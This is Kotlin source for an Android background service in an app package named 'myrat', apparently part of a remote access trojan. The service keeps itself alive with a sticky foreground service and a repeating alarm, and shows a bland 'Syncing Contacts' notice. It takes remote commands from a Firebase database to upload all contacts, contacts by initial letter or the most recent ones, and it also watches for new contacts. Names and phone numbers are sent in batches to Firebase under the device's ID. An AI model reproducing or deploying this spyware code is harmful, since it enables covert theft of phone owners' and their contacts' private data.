package com.myrat.app.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.database.ContentObserver
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.provider.ContactsContract
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*

class ContactUploadService : Service() {
    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private lateinit var sharedPref: SharedPreferences
    private var contactObserver: ContentObserver? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        startForegroundService()
        scheduleRestart(this)
        deviceId = MainActivity.getDeviceId(this)
        sharedPref = getSharedPreferences("contact_pref", Context.MODE_PRIVATE)
        Logger.log("ContactUploadService started for deviceId: $deviceId")

        // Initialize real-time contact monitoring
        setupContactObserver()
        // Check for initial upload command
        listenForUploadCommand()
    }

    private fun scheduleRestart(context: Context) {
        val alarmIntent = Intent(context, CallLogUploadService::class.java)
        val pendingIntent = PendingIntent.getService(
            context, 0, alarmIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )


        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.setRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 60_000, // delay before restart
            5 * 60_000, // repeat every 5 minutes
            pendingIntent
        )
    }

    private fun startForegroundService() {
        val channelId = "ContactUploader"
        val channelName = "Contact Upload Service"

        val manager = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            channel.setShowBadge(false)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Syncing Contacts")
            .setContentText("Monitoring and uploading contact details")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        startForeground(7, notification)
    }

    private fun setupContactObserver() {
        contactObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                Logger.log("Contact change detected")
                uploadNewContacts()
            }
        }

        contentResolver.registerContentObserver(
            ContactsContract.Contacts.CONTENT_URI,
            true,
            contactObserver!!
        )
        Logger.log("Contact observer registered")
    }

    private fun listenForUploadCommand() {
        val contactsRef = db.child("Device").child(deviceId).child("contacts")

        contactsRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val shouldUpload = snapshot.child("getContacts").getValue(Boolean::class.java) ?: false
                val letter = snapshot.child("Letter").getValue(String::class.java)?.uppercase()
                val howMany = snapshot.child("HowManyNumToUpload").getValue(Int::class.java) ?: 0
                val allContacts = snapshot.child("AllContacts").getValue(Boolean::class.java) ?: false

                if (shouldUpload) {
                    when {
                        allContacts -> {
                            Logger.log("Command received: Upload all contacts")
                            uploadAllContacts()
                        }
                        letter?.isNotEmpty() == true -> {
                            Logger.log("Command received: Upload contacts starting with letter $letter")
                            uploadContactsByLetter(letter)
                        }
                        howMany > 0 -> {
                            Logger.log("Command received: Upload $howMany contacts")
                            uploadRecentContactsByCount(howMany)
                        }
                        else -> {
                            Logger.log("Invalid command parameters: letter=$letter, howMany=$howMany, allContacts=$allContacts")
                        }
                    }
                    // Reset the trigger
                    contactsRef.child("getContacts").setValue(false)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Logger.log("Failed to read upload command: ${error.message}")
            }
        })
    }

    private fun uploadNewContacts() {
        val lastTimestamp = sharedPref.getLong("last_contact_timestamp", 0L)
        val cursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.LAST_TIME_CONTACTED,
                ContactsContract.Contacts._ID
            ),
            "${ContactsContract.Contacts.LAST_TIME_CONTACTED} > ?",
            arrayOf(lastTimestamp.toString()),
            "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
        )

        val contactList = mutableListOf<Map<String, Any>>()
        var latestTimestamp = lastTimestamp

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: "Unknown"
                val lastContacted = it.getLong(it.getColumnIndexOrThrow(ContactsContract.Contacts.LAST_TIME_CONTACTED))
                val contactId = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))

                val phoneNumbers = getPhoneNumbers(contactId)

                contactList.add(
                    mapOf(
                        "name" to name,
                        "phoneNumbers" to phoneNumbers,
                        "lastContacted" to lastContacted,
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (lastContacted > latestTimestamp) latestTimestamp = lastContacted
            }
        }

        if (contactList.isNotEmpty()) {
            Logger.log("Found ${contactList.size} new contacts since $lastTimestamp")
            uploadInBatches(contactList, latestTimestamp)
        } else {
            Logger.log("No new contacts since $lastTimestamp")
        }
    }

    private fun uploadAllContacts() {
        val cursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.LAST_TIME_CONTACTED,
                ContactsContract.Contacts._ID
            ),
            null,
            null,
            "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
        )

        val contactList = mutableListOf<Map<String, Any>>()
        var latestTimestamp = 0L

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: "Unknown"
                val lastContacted = it.getLong(it.getColumnIndexOrThrow(ContactsContract.Contacts.LAST_TIME_CONTACTED))
                val contactId = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))

                val phoneNumbers = getPhoneNumbers(contactId)

                contactList.add(
                    mapOf(
                        "name" to name,
                        "phoneNumbers" to phoneNumbers,
                        "lastContacted" to lastContacted,
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (lastContacted > latestTimestamp) latestTimestamp = lastContacted
            }
        }

        if (contactList.isNotEmpty()) {
            Logger.log("Found ${contactList.size} contacts")
            uploadInBatches(contactList, latestTimestamp)
        } else {
            Logger.log("No contacts found")
        }
    }

    private fun uploadContactsByLetter(letter: String) {
        val cursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.LAST_TIME_CONTACTED,
                ContactsContract.Contacts._ID
            ),
            "${ContactsContract.Contacts.DISPLAY_NAME} LIKE ?",
            arrayOf("$letter%"),
            "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
        )

        val contactList = mutableListOf<Map<String, Any>>()
        var latestTimestamp = 0L

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: "Unknown"
                val lastContacted = it.getLong(it.getColumnIndexOrThrow(ContactsContract.Contacts.LAST_TIME_CONTACTED))
                val contactId = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))

                val phoneNumbers = getPhoneNumbers(contactId)

                contactList.add(
                    mapOf(
                        "name" to name,
                        "phoneNumbers" to phoneNumbers,
                        "lastContacted" to lastContacted,
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (lastContacted > latestTimestamp) latestTimestamp = lastContacted
            }
        }

        if (contactList.isNotEmpty()) {
            Logger.log("Found ${contactList.size} contacts starting with $letter")
            uploadInBatches(contactList, latestTimestamp)
        } else {
            Logger.log("No contacts found starting with $letter")
        }
    }

    private fun uploadRecentContactsByCount(limit: Int) {
        val cursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.LAST_TIME_CONTACTED,
                ContactsContract.Contacts._ID
            ),
            null,
            null,
            "${ContactsContract.Contacts.LAST_TIME_CONTACTED} DESC"
        )

        val contactList = mutableListOf<Map<String, Any>>()
        var latestTimestamp = 0L

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < limit) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: "Unknown"
                val lastContacted = it.getLong(it.getColumnIndexOrThrow(ContactsContract.Contacts.LAST_TIME_CONTACTED))
                val contactId = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))

                val phoneNumbers = getPhoneNumbers(contactId)

                contactList.add(
                    mapOf(
                        "name" to name,
                        "phoneNumbers" to phoneNumbers,
                        "lastContacted" to lastContacted,
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (lastContacted > latestTimestamp) latestTimestamp = lastContacted
                count++
            }
        }

        if (contactList.isNotEmpty()) {
            Logger.log("Fetched ${contactList.size} recent contacts")
            uploadInBatches(contactList, latestTimestamp)
        } else {
            Logger.log("No contacts found")
        }
    }

    private fun getPhoneNumbers(contactId: String): List<Map<String, String>> {
        val phoneNumbers = mutableListOf<Map<String, String>>()
        val phoneCursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TYPE
            ),
            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
            arrayOf(contactId),
            null
        )

        phoneCursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                val type = when (it.getInt(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))) {
                    ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
                    ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
                    ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
                    else -> "Other"
                }
                phoneNumbers.add(mapOf("number" to number, "type" to type))
            }
        }
        return phoneNumbers
    }

    private fun uploadInBatches(
        contacts: List<Map<String, Any>>,
        latestTimestamp: Long,
        batchSize: Int = 25,
        delayBetweenBatches: Long = 300L
    ) {
        scope.launch {
            val contactsRef = db.child("Device").child(deviceId).child("contacts/data")

            contacts.chunked(batchSize).forEachIndexed { index, batch ->
                Logger.log("Uploading batch ${index + 1}/${(contacts.size + batchSize - 1) / batchSize}")

                val tasks = batch.map {
                    async {
                        contactsRef.push().setValue(it).addOnFailureListener { e ->
                            Logger.log("Upload failed: ${e.message}")
                        }
                    }
                }

                tasks.awaitAll()
                delay(delayBetweenBatches)
            }

            sharedPref.edit().putLong("last_contact_timestamp", latestTimestamp).apply()
            Logger.log("Upload complete. Latest timestamp saved: $latestTimestamp")

            db.child("Device").child(deviceId).child("contacts").child("lastUploadCompleted")
                .setValue(System.currentTimeMillis())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Ensures service restarts if killed
    }

    override fun onDestroy() {
        super.onDestroy()
        contactObserver?.let {
            contentResolver.unregisterContentObserver(it)
            Logger.log("Contact observer unregistered")
        }
        scope.cancel()
        Logger.log("ContactUploadService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}